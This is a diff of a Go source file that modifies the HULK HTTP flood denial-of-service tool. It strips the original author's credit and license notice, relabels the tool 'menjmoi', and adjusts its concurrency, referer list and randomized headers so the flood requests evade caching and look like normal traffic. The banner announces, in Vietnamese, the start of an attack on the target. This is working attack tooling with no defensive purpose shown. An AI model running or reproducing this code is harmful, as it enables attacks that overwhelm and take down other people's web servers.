@@ -1,13 +1,7 @@
 package main
-
 /*
- HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
- Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
-
- This go program licensed under GPLv3.
- Copyright Alexander I.Grafov <grafov@gmail.com>
+menjmoi
 */
-
 import (
 	"flag"
 	"fmt"
@@ -43,6 +37,7 @@ var (
 		"http://www.usatoday.com/search/results?q=",
 		"http://engadget.search.aol.com/search?q=",
 		"http://www.google.ru/?hl=ru&q=",
+		"https://search.yahoo.com/search?q=",
 		"http://yandex.ru/yandsearch?text=",
 	}
 	headersUseragents []string = []string{
@@ -94,7 +89,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 102023
+		maxproc = 12023
 	}
 
 	u, err := url.Parse(site)
@@ -124,12 +119,12 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- menjmoi: bat dau tan cong muc tieu! --\n           Go!\n\n")
+		fmt.Println("-- menjmoi: bat dau tan cong muc tieu! --\n           kill!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
 		)
-		fmt.Println("In use               |\tResp OK |\tGot err")
+		fmt.Println("In use               |\t Thanh cong |\t Loi")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
@@ -191,8 +186,8 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
 		q.Header.Set("Cache-Control", "no-cache")
 		q.Header.Set("Accept-Charset", acceptCharset)
-		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
-		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
+		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(10)+5))
+		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(30)+30))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
 
